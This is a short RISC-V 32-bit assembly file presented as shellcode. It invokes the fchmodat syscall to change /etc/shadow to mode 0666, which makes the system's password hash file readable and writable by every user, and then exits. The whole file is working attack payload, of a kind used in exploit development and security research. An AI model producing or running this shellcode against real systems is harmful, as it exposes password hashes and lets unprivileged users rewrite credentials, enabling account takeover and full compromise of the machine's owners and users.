# RISC-V 32-bit chmod(/etc/shadow, 0666) shellcode
# ---
# bcoles

.global _start
.section .text

_start:
    # sys_fchmodat(int dfd, const char *filename, umode_t mode, int flags)
    # fchmodat(AT_FDCWD, "/etc/shadow", 0666, 0)

    li      a0, -100  # AT_FDCWD
    la      a1, path  # pointer to path
    li      a2, 0666  # mode
    li      a3, 0     # flags
    li      a7, 53    # __NR_fchmodat
    ecall

    li      a0, 0
    li      a7, 93    # __NR_exit
    ecall

path:
    .asciz "/etc/shadow"
